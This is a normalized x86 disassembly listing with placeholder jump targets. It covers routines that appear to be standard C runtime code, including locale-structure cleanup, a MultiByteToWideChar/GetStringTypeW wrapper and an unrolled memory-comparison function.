call sub_41cdd8
add esp 0xc
mov edx eax
jmp r-xdata
call sub_411550
mov [ eax ] 0x16
call sub_411714
mov edx 0x7fffffff
jmp r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
jne r-xdata
movzx eax [ esi ]
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
movzx eax al
dec edi
inc esi
test [ eax + ecx + 0x19 ] 0x4
mov [ ebp - 0x8 ] esi
je r-xdata
mov si [ ebp - 0x4 ]
movzx eax si
test [ eax + ecx + 0x19 ] 0x10
je r-xdata
test edi edi
jne r-xdata
movzx eax [ ebx ]
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x10 ] eax
movzx eax al
inc ebx
test [ eax + ecx + 0x19 ] 0x4
je r-xdata
movzx eax [ eax + ecx + 0x119 ]
mov [ ebp - 0x4 ] eax
mov al [ esi ]
test al al
jne r-xdata
movzx eax [ ebx ]
mov [ ebp - 0x4 ] edx
test [ eax + ecx + 0x19 ] 0x4
jne r-xdata
mov ax [ ebp + 0x10 ]
movzx edx ax
push 0x0
test [ edx + ecx + 0x19 ] 0x10
mov [ ebp + 0x10 ] edx
pop edx
je r-xdata
test edi edi
jne r-xdata
shl [ ebp + 0x10 ] 0x8
movzx eax al
or [ ebp + 0x10 ] ax
mov eax [ ebp + 0x10 ]
movzx eax ax
inc esi
mov [ ebp - 0x8 ] esi
mov si ax
mov [ ebp - 0x4 ] eax
cmp si [ ecx + 0xc ]
jb r-xdata
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov al [ ebx ]
movzx eax al
mov si dx
jmp r-xdata
cmp ax si
jne r-xdata
mov eax [ ebp + 0x10 ]
movzx eax [ eax + ecx + 0x119 ]
mov al [ ebx ]
dec edi
test al al
je r-xdata
mov [ ebp + 0x10 ] edx
jmp r-xdata
cmp si [ ecx + 0x12 ]
jb r-xdata
cmp si [ ecx + 0xe ]
ja r-xdata
mov si [ ebp - 0x4 ]
mov [ ebp + 0x10 ] eax
sbb edx edx
and edx 0x2
dec edx
test si si
je r-xdata
shl [ ebp - 0x4 ] 0x8
movzx eax al
or [ ebp - 0x4 ] ax
mov eax [ ebp - 0x4 ]
movzx eax ax
inc ebx
mov [ ebp + 0x10 ] eax
cmp ax [ ecx + 0xc ]
jb r-xdata
mov ax [ ebp + 0x10 ]
cmp si [ ecx + 0x14 ]
ja r-xdata
add si [ ecx + 0x10 ]
jmp r-xdata
mov esi [ ebp - 0x8 ]
test edi edi
jne r-xdata
cmp ax [ ecx + 0x12 ]
jb r-xdata
cmp ax [ ecx + 0xe ]
ja r-xdata
add si [ ecx + 0x16 ]
jmp r-xdata
jmp r-xdata
cmp ax [ ecx + 0x14 ]
ja r-xdata
add ax [ ecx + 0x10 ]
jmp r-xdata
add ax [ ecx + 0x16 ]
jmp r-xdata
sub_41aa3e
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40e8f2
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40e8f2
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40e8f2
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40e8f2
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40e8f2
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40e8f2
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40e8f2
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40e8f2
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40e8f2
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40e8f2
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40e8f2
pop ecx
mov eax [ esi + 0x4c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40e8f2
pop ecx
push eax
call sub_40e8f2
pop ecx
sub_41ab3a
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40e8f2
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40e8f2
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40e8f2
pop ecx
mov eax [ esi + 0x34 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_40e8f2
pop ecx
push eax
call sub_40e8f2
pop ecx
sub_41aba1
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_40e8f2
push [ esi + 0x8 ]
call sub_40e8f2
push [ esi + 0xc ]
call sub_40e8f2
push [ esi + 0x10 ]
call sub_40e8f2
push [ esi + 0x14 ]
call sub_40e8f2
push [ esi + 0x18 ]
call sub_40e8f2
push [ esi ]
call sub_40e8f2
push [ esi + 0x20 ]
call sub_40e8f2
push [ esi + 0x24 ]
call sub_40e8f2
push [ esi + 0x28 ]
call sub_40e8f2
push [ esi + 0x2c ]
call sub_40e8f2
push [ esi + 0x30 ]
call sub_40e8f2
push [ esi + 0x34 ]
call sub_40e8f2
push [ esi + 0x1c ]
call sub_40e8f2
push [ esi + 0x38 ]
call sub_40e8f2
push [ esi + 0x3c ]
call sub_40e8f2
add esp 0x40
push [ esi + 0x40 ]
call sub_40e8f2
push [ esi + 0x44 ]
call sub_40e8f2
push [ esi + 0x48 ]
call sub_40e8f2
push [ esi + 0x4c ]
call sub_40e8f2
push [ esi + 0x50 ]
call sub_40e8f2
push [ esi + 0x54 ]
call sub_40e8f2
push [ esi + 0x58 ]
call sub_40e8f2
push [ esi + 0x5c ]
call sub_40e8f2
push [ esi + 0x60 ]
call sub_40e8f2
push [ esi + 0x64 ]
call sub_40e8f2
push [ esi + 0x68 ]
call sub_40e8f2
push [ esi + 0x6c ]
call sub_40e8f2
push [ esi + 0x70 ]
call sub_40e8f2
push [ esi + 0x74 ]
call sub_40e8f2
push [ esi + 0x78 ]
call sub_40e8f2
push [ esi + 0x7c ]
call sub_40e8f2
add esp 0x40
push [ esi + 0x80 ]
call sub_40e8f2
push [ esi + 0x84 ]
call sub_40e8f2
push [ esi + 0x88 ]
call sub_40e8f2
push [ esi + 0x8c ]
call sub_40e8f2
push [ esi + 0x90 ]
call sub_40e8f2
push [ esi + 0x94 ]
call sub_40e8f2
push [ esi + 0x98 ]
call sub_40e8f2
push [ esi + 0x9c ]
call sub_40e8f2
push [ esi + 0xa0 ]
call sub_40e8f2
push [ esi + 0xa4 ]
call sub_40e8f2
push [ esi + 0xa8 ]
call sub_40e8f2
push [ esi + 0xb8 ]
call sub_40e8f2
push [ esi + 0xbc ]
call sub_40e8f2
push [ esi + 0xc0 ]
call sub_40e8f2
push [ esi + 0xc4 ]
call sub_40e8f2
push [ esi + 0xc8 ]
call sub_40e8f2
add esp 0x40
push [ esi + 0xcc ]
call sub_40e8f2
push [ esi + 0xb4 ]
call sub_40e8f2
push [ esi + 0xd4 ]
call sub_40e8f2
push [ esi + 0xd8 ]
call sub_40e8f2
push [ esi + 0xdc ]
call sub_40e8f2
push [ esi + 0xe0 ]
call sub_40e8f2
push [ esi + 0xe4 ]
call sub_40e8f2
push [ esi + 0xe8 ]
call sub_40e8f2
push [ esi + 0xd0 ]
call sub_40e8f2
push [ esi + 0xec ]
call sub_40e8f2
push [ esi + 0xf0 ]
call sub_40e8f2
push [ esi + 0xf4 ]
call sub_40e8f2
push [ esi + 0xf8 ]
call sub_40e8f2
push [ esi + 0xfc ]
call sub_40e8f2
push [ esi + 0x100 ]
call sub_40e8f2
push [ esi + 0x104 ]
call sub_40e8f2
add esp 0x40
push [ esi + 0x108 ]
call sub_40e8f2
push [ esi + 0x10c ]
call sub_40e8f2
push [ esi + 0x110 ]
call sub_40e8f2
push [ esi + 0x114 ]
call sub_40e8f2
push [ esi + 0x118 ]
call sub_40e8f2
push [ esi + 0x11c ]
call sub_40e8f2
push [ esi + 0x120 ]
call sub_40e8f2
push [ esi + 0x124 ]
call sub_40e8f2
push [ esi + 0x128 ]
call sub_40e8f2
push [ esi + 0x12c ]
call sub_40e8f2
push [ esi + 0x130 ]
call sub_40e8f2
push [ esi + 0x134 ]
call sub_40e8f2
push [ esi + 0x138 ]
call sub_40e8f2
push [ esi + 0x13c ]
call sub_40e8f2
push [ esi + 0x140 ]
call sub_40e8f2
push [ esi + 0x144 ]
call sub_40e8f2
add esp 0x40
push [ esi + 0x148 ]
call sub_40e8f2
push [ esi + 0x14c ]
call sub_40e8f2
push [ esi + 0x150 ]
call sub_40e8f2
push [ esi + 0x154 ]
call sub_40e8f2
push [ esi + 0x158 ]
call sub_40e8f2
push [ esi + 0x15c ]
call sub_40e8f2
push [ esi + 0x160 ]
call sub_40e8f2
add esp 0x1c
sub_41af21
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x1c ]
push ebx
push esi
push edi
xor edi edi
test ecx ecx
jne r-xdata
xor eax eax
cmp [ ebp + 0x20 ] eax
push edi
push edi
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push ecx
call [ MultiByteToWideChar@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
mov ecx eax
jle r-xdata
xor eax eax
jmp r-xdata
mov esi edi
cmp ebx 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40e09b
leave
retn
lea eax [ ebx + ebx ]
push eax
push edi
push esi
call sub_414160
add esp 0xc
push ebx
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea eax [ ebx * 2 + 0x8 ]
cmp eax 0x400
ja r-xdata
push esi
call sub_40ff5b
pop ecx
mov eax edi
push [ ebp + 0x18 ]
push eax
push esi
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov edi eax
push eax
call sub_40e92a
mov esi eax
pop ecx
test esi esi
je r-xdata
call sub_4168d0
mov esi esp
test esi esi
je r-xdata
mov [ esi ] 0xdddd
mov [ esi ] 0xcccc
jmp r-xdata
test esi esi
je r-xdata
add esi 0x8
jmp r-xdata
sub_41b00d
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40f858
push [ ebp + 0x20 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_41af21
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_41b04b
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
mov eax ebx
push esi
sub eax 0x0
je r-xdata
xor eax eax
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
movzx ecx [ eax ]
mov eax [ ebp + 0xc ]
movzx eax [ eax ]
jmp r-xdata
dec eax
je r-xdata
sub ecx eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx ecx [ edx ]
movzx eax [ esi ]
sub ecx eax
je r-xdata
dec eax
je r-xdata
mov eax ecx
jmp r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
movzx ecx [ edx + 0x1 ]
movzx eax [ esi + 0x1 ]
jmp r-xdata
xor eax eax
test ecx ecx
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx ecx [ edx ]
movzx eax [ esi ]
sub ecx eax
je r-xdata
mov edx [ ebp + 0xc ]
dec eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
movzx ecx [ edx + 0x1 ]
movzx eax [ esi + 0x1 ]
sub ecx eax
je r-xdata
xor eax eax
test ecx ecx
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx eax [ edx ]
movzx esi [ ecx ]
sub esi eax
je r-xdata
mov esi [ ebp + 0x8 ]
push edi
cmp ebx 0x20
jb r-xdata
movzx ecx [ edx + 0x2 ]
movzx eax [ esi + 0x2 ]
jmp r-xdata
xor eax eax
test ecx ecx
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0x1 ]
movzx eax [ edx + 0x1 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
add esi ebx
add edx ebx
cmp ebx 0x1f
ja r-xdata
mov eax [ esi ]
cmp eax [ edx ]
je r-xdata
movzx esi [ ecx + 0x2 ]
movzx eax [ edx + 0x2 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
xor ecx ecx
jmp [ ebx * 4 + jump_table_41c743 ]
xor ecx ecx
movzx edi al
movzx eax [ edx ]
sub edi eax
je r-xdata
movzx ecx [ ecx + 0x3 ]
movzx eax [ edx + 0x3 ]
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov eax [ esi - 0x1c ]
cmp eax [ edx - 0x1c ]
je r-xdata
mov eax [ esi - 0x18 ]
cmp eax [ edx - 0x18 ]
je r-xdata
mov eax [ esi - 0x14 ]
cmp eax [ edx - 0x14 ]
je r-xdata
mov eax [ esi - 0x10 ]
cmp eax [ edx - 0x10 ]
je r-xdata
mov eax [ esi - 0xc ]
cmp eax [ edx - 0xc ]
je r-xdata
mov eax [ esi - 0x8 ]
cmp eax [ edx - 0x8 ]
je r-xdata
mov eax [ esi - 0x4 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ esi - 0x1d ]
cmp eax [ edx - 0x1d ]
je r-xdata
mov eax [ esi - 0x19 ]
cmp eax [ edx - 0x19 ]
je r-xdata
mov eax [ esi - 0x15 ]
cmp eax [ edx - 0x15 ]
je r-xdata
mov eax [ esi - 0x11 ]
cmp eax [ edx - 0x11 ]
je r-xdata
mov eax [ esi - 0xd ]
cmp eax [ edx - 0xd ]
je r-xdata
mov eax [ esi - 0x9 ]
cmp eax [ edx - 0x9 ]
je r-xdata
mov eax [ esi - 0x5 ]
cmp eax [ edx - 0x5 ]
je r-xdata
movzx eax [ edx - 0x1 ]
movzx ecx [ esi - 0x1 ]
sub ecx eax
je r-xdata
mov eax [ esi - 0x1e ]
cmp eax [ edx - 0x1e ]
je r-xdata
mov eax [ esi - 0x1a ]
cmp eax [ edx - 0x1a ]
je r-xdata
mov eax [ esi - 0x16 ]
cmp eax [ edx - 0x16 ]
je r-xdata
mov eax [ esi - 0x12 ]
cmp eax [ edx - 0x12 ]
je r-xdata
mov eax [ esi - 0xe ]
cmp eax [ edx - 0xe ]
je r-xdata
mov eax [ esi - 0xa ]
cmp eax [ edx - 0xa ]
je r-xdata
mov eax [ esi - 0x6 ]
cmp eax [ edx - 0x6 ]
je r-xdata
mov ax [ esi - 0x2 ]
cmp ax [ edx - 0x2 ]
je r-xdata
mov eax [ esi - 0x1f ]
cmp eax [ edx - 0x1f ]
je r-xdata
mov eax [ esi - 0x1b ]
cmp eax [ edx - 0x1b ]
je r-xdata
mov eax [ esi - 0x17 ]
cmp eax [ edx - 0x17 ]
je r-xdata
mov eax [ esi - 0x13 ]
cmp eax [ edx - 0x13 ]
je r-xdata
mov eax [ esi - 0xf ]
cmp eax [ edx - 0xf ]
je r-xdata
mov eax [ esi - 0xb ]
cmp eax [ edx - 0xb ]
je r-xdata
mov eax [ esi - 0x7 ]
cmp eax [ edx - 0x7 ]
je r-xdata
movzx edi [ esi - 0x3 ]
movzx eax [ edx - 0x3 ]
sub edi eax
je r-xdata
mov eax ecx
pop edi
jmp r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
movzx edi [ esi + 0x1 ]
movzx eax [ edx + 0x1 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1c ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x18 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x14 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x10 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx eax [ edx - 0xc ]
movzx edi [ esi - 0xc ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x8 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x4 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1d ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x19 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x15 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x11 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0xd ]
sub edi eax
je r-xdata
xor ecx ecx
movzx eax [ edx - 0x9 ]
movzx edi [ esi - 0x9 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x5 ]
sub edi eax
je r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1e ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1a ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x16 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x12 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0xe ]
sub edi eax
je r-xdata
xor ecx ecx
movzx eax [ edx - 0xa ]
movzx edi [ esi - 0xa ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x6 ]
sub edi eax
je r-xdata
jmp r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1f ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1b ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x17 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x13 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx eax [ edx - 0xf ]
movzx edi [ esi - 0xf ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0xb ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x7 ]
sub edi eax
je r-xdata
movzx eax [ edx - 0x2 ]
movzx edi [ esi - 0x2 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x4 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x2 ]
movzx eax [ edx + 0x2 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1b ]
movzx eax [ edx - 0x1b ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x17 ]
movzx eax [ edx - 0x17 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x13 ]
movzx eax [ edx - 0x13 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xf ]
movzx eax [ edx - 0xf ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xb ]
movzx eax [ edx - 0xb ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x7 ]
movzx eax [ edx - 0x7 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x3 ]
movzx eax [ edx - 0x3 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1c ]
movzx eax [ edx - 0x1c ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x18 ]
movzx eax [ edx - 0x18 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x14 ]
movzx eax [ edx - 0x14 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x10 ]
movzx eax [ edx - 0x10 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xc ]
movzx eax [ edx - 0xc ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x8 ]
movzx eax [ edx - 0x8 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x4 ]
movzx eax [ edx - 0x4 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1d ]
movzx eax [ edx - 0x1d ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x19 ]
movzx eax [ edx - 0x19 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x15 ]
movzx eax [ edx - 0x15 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x11 ]
movzx eax [ edx - 0x11 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xd ]
movzx eax [ edx - 0xd ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x9 ]
movzx eax [ edx - 0x9 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x5 ]
movzx eax [ edx - 0x5 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1e ]
movzx eax [ edx - 0x1e ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1a ]
movzx eax [ edx - 0x1a ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x16 ]
movzx eax [ edx - 0x16 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x12 ]
movzx eax [ edx - 0x12 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xe ]
movzx eax [ edx - 0xe ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xa ]
movzx eax [ edx - 0xa ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x6 ]
movzx eax [ edx - 0x6 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ edx + 0x8 ]
je r-xdata
movzx edi [ esi + 0x5 ]
movzx eax [ edx + 0x5 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x3 ]
movzx eax [ edx + 0x3 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1a ]
movzx eax [ edx - 0x1a ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x16 ]
movzx eax [ edx - 0x16 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x12 ]
movzx eax [ edx - 0x12 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xe ]
movzx eax [ edx - 0xe ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xa ]
movzx eax [ edx - 0xa ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x6 ]
movzx eax [ edx - 0x6 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x2 ]
movzx eax [ edx - 0x2 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1b ]
movzx eax [ edx - 0x1b ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x17 ]
movzx eax [ edx - 0x17 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x13 ]
movzx eax [ edx - 0x13 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xf ]
movzx eax [ edx - 0xf ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xb ]
